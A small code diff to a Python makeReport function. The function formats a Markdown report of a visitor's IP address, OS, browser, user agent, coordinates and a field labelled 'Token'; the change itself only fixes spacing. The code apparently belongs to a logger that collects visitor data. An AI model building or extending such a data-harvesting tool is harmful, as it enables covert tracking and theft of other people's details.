@@ -149,7 +149,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
->**Token:** `{ip if ip else 'Unknown'}`
+> **Token:** `{ip if ip else 'Unknown'}`
 
 **User Agent:**
 ```
